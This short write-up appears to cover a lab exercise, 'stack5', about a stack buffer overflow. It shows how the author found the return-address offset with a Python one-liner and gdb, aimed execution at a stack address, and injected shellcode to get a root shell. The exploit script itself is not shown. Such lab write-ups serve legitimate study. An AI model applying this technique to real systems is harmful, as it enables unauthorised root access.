**Stack5**

This is the first, real buffer overflow.
We need to:
1. Find eip's offset
2. Change it to a stack value
3. Insert shellcode

```diff
$ python -c "print 'a'*76 + 'BBBB'" > /tmp/file
$ gdb stack5
$ r < /tmp/file
```

Then we look at the stack using x/4 $esp, The value 0xbffff7b0 comes up.
We write the overflow and execute it

```diff
$ python stack5.py
Illegal...
```

What?
This took a while, only after changing eip by a few bytes the overflow started working.

```diff
$ python stack5.py
```

Trace/...
Okay, now we put in the shellcode.

```diff
$ python stack5.py
$ whoami
root
```